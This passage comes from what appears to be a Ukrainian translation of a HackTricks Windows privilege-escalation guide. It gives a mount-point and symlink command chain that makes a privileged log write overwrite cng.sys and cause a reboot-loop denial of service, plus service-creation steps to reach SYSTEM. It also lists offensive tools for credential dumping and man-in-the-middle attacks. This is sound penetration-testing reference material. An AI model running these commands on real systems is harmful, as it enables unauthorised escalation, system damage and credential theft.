- Можливість створити точку монтування до `\RPC Control` і OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Привілейована операція, яка записує за цим шляхом (журнал, експорт, звіт).

**Приклад ланцюжка**
1. Прочитайте конфігурацію, щоб визначити привілейоване розташування журналу, наприклад `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` у `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Перенаправте шлях без прав адміністратора:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Дочекайтеся, поки привілейований компонент запише журнал (наприклад, адміністратор натисне «Надіслати тестове SMS»). Тепер запис потрапить у `C:\Windows\System32\cng.sys`.
4. Перевірте перезаписаний файл (hex/PE-парсером), щоб підтвердити його пошкодження; перезавантаження змусить Windows завантажити підмінений драйвер → **DoS через цикл перезавантаження**. Це також працює з будь-яким захищеним файлом, який привілейована служба відкриє для запису.

> `cng.sys` зазвичай завантажується з `C:\Windows\System32\drivers\cng.sys`, але якщо копія є в `C:\Windows\System32\cng.sys`, спочатку може бути використана вона, що робить цей файл надійною ціллю для DoS із пошкодженими даними.



## **Від високого рівня цілісності до SYSTEM**

### **Нова служба**

Якщо ви вже працюєте в процесі з високим рівнем цілісності, **шлях до SYSTEM** може бути простим: достатньо **створити й запустити нову службу**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Під час створення бінарного файлу служби переконайтеся, що це дійсна служба або що бінарний файл швидко виконує необхідні дії, оскільки його буде завершено через 20 секунд, якщо це не дійсна служба.

### AlwaysInstallElevated

З процесу з високим рівнем цілісності можна спробувати **увімкнути записи AlwaysInstallElevated у реєстрі** та **встановити** reverse shell за допомогою обгортки _**.msi**_.\
[Докладніше про залучені ключі реєстру та встановлення пакета _.msi_ — тут.](#alwaysinstallelevated)

### Від High + привілею SeImpersonate до System

**Ви можете** [**знайти код тут**](seimpersonate-from-high-to-system.md)**.**

### Від SeDebug + SeImpersonate до повних привілеїв токена

Якщо у вас є ці привілеї токена (імовірно, ви знайдете їх у вже запущеному процесі з високим рівнем цілісності), ви зможете **відкрити майже будь-який процес** (окрім захищених процесів) за допомогою привілею SeDebug, **скопіювати токен** процесу та створити **довільний процес із цим токеном**.\
Зазвичай для цієї техніки **вибирають будь-який процес, що працює як SYSTEM і має всі привілеї токена** (_так, можна знайти процеси SYSTEM без усіх привілеїв токена_).\
**Приклад коду, що виконує запропоновану техніку, можна знайти** [**тут**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Цю техніку meterpreter використовує для підвищення привілеїв у `getsystem`. Вона полягає в **створенні каналу, а потім створенні/зловживанні службою для запису в цей канал**. Після цього **сервер**, який створив канал за допомогою привілею **`SeImpersonate`**, зможе **імперсонувати токен** клієнта каналу (служби) й отримати привілеї SYSTEM.\
Щоб [**дізнатися більше про іменовані канали, прочитайте це**](#named-pipe-client-impersonation).\
Приклад [**переходу від високого рівня цілісності до System за допомогою іменованих каналів наведено тут**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Якщо вам вдасться **перехопити dll**, яку **завантажує** **процес**, що працює від імені **SYSTEM**, ви зможете виконати довільний код із цими дозволами. Тому Dll Hijacking також корисний для такого підвищення привілеїв. Крім того, його **набагато легше здійснити з процесу з високим рівнем цілісності**, оскільки такий процес матиме **дозволи на запис** до папок, з яких завантажуються dll.\
**Ви можете** [**дізнатися більше про Dll hijacking тут**](dll-hijacking/index.html)**.**

### **Від Administrator або Network Service до System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### Від LOCAL SERVICE або NETWORK SERVICE до повних привілеїв

**Читайте:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Додаткова допомога

[Статичні бінарні файли impacket](https://github.com/ropnop/impacket_static_binaries)

## Корисні інструменти

**Найкращий інструмент для пошуку векторів локального підвищення привілеїв у Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Перевіряє неправильні конфігурації та чутливі файли (**[**переглянути тут**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Виявляється.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Перевіряє деякі можливі неправильні конфігурації та збирає інформацію (**[**переглянути тут**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Перевіряє неправильні конфігурації**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Витягує збережені дані сеансів PuTTY, WinSCP, SuperPuTTY, FileZilla та RDP. Локально використовуйте параметр -Thorough.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Витягує облікові дані з Credential Manager. Виявляється.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Перевіряє зібрані паролі на домені**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh — це інструмент PowerShell для підміни ADIDNS/LLMNR/mDNS і атак типу man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Базовий інструмент переліку даних Windows для privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Пошук відомих вразливостей для privesc (ЗАСТАРІЛИЙ, замінений на Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Локальні перевірки **(потрібні права Admin)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Пошук відомих вразливостей для privesc (потрібно скомпілювати за допомогою VisualStudio) ([**скомпільована версія**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Перевіряє хост на наявність неправильних конфігурацій (це радше інструмент для збору інформації, ніж для privesc) (потрібно скомпілювати) **(**[**скомпільована версія**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Витягує облікові дані з багатьох програм (скомпільований exe доступний на github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Порт PowerUp на C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Перевіряє неправильні конфігурації (скомпільований виконуваний файл доступний на github). Не рекомендовано. Погано працює у Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Перевіряє можливі неправильні конфігурації (exe на Python). Не рекомендовано. Погано працює у Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Інструмент, створений на основі цієї публікації (для коректної роботи йому не потрібен accesschk, але він може його використовувати).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Зчитує вивід **systeminfo** і рекомендує робочі експлойти (локальна версія на Python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Зчитує вивід **systeminfo** і рекомендує робочі експлойти (локальна версія на Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Проєкт потрібно скомпілювати з правильною версією .NET ([дивіться тут](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Щоб переглянути встановлену на хості жертви версію .NET, виконайте:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Основи ескалації привілеїв у Windows](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Підвищення привілеїв через експлуатацію слабких дозволів на папки](http://www.greyhathacker.net/?p=738)
- [3] [Ескалація привілеїв у Windows — шпаргалка](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop — воркшоп з локальної ескалації привілеїв у Windows / Linux](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 — атаки на Windows: AT — це новий чорний (Rob Fuller і Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Ескалація привілеїв у Windows — повний посібник з OSCP](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows — ескалація привілеїв — PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Посібник з ескалації привілеїв у Windows](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Контрольний список з ескалації привілеїв у Windows](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Ескалація привілеїв у Windows](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Методи ескалації привілеїв у Windows для Pentesters](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf — HTB/VulnLab JobTwo: фішинг через макрос Word VBA і SMTP → розшифрування облікових даних hMailServer → Veeam CVE-2023-27532 до SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: leak через format string + stack BOF → VirtualAlloc ROP (RCE) і крадіжка kernel token](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research — у гонитві за Silver Fox: гра в кішки-мишки в тінях kernel](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 — уразливість привілейованої файлової системи в системі SCADA](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Інструменти для тестування symbolic link — використання CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Назад у минуле. Зловживання symbolic link у Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn — MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (порт Cobalt Strike BOF)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI — Node.js Trust Falls: небезпечне визначення модулів у Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Модулі Node.js: завантаження з папок `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits — розв'язані завдання за контрольним списком C/C++](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn — функція RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery — NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone — CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone — перехоплення бінарних файлів служб](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own з Microslop: об'єднання CLDFLT і race condition у ядрі DirectX для LPE у Windows](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Один I/O Ring, щоб керувати ними всіма: повноцінний примітив читання/запису у Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Зловживання довільним видаленням файлів для ескалації привілеїв та інші корисні трюки](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC — код експлойту FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure — атаки на WSUS, частина 2: CVE-2020-1013, ескалація привілеїв у Windows 10 у день виходу виправлення](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: дослідження Credential Manager і Windows Vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n — PoC для CVE-2019-1388](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com — делегування з обмеженнями на основі ресурсів Kerberos: як зміна образу призводить до ескалації привілеїв](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com — вилучення приватних ключів SSH з агента SSH у Windows 10](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps — перетворення серверів оновлень підприємства на фабрики бекдорів (0_o) — частина 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps — перетворення серверів оновлень підприємства на фабрики бекдорів (0_o) — частина 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s — NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence — ескалація привілеїв через видалення папки Windows Installer](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center — CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
{{#include ../../banners/hacktricks-training.md}}
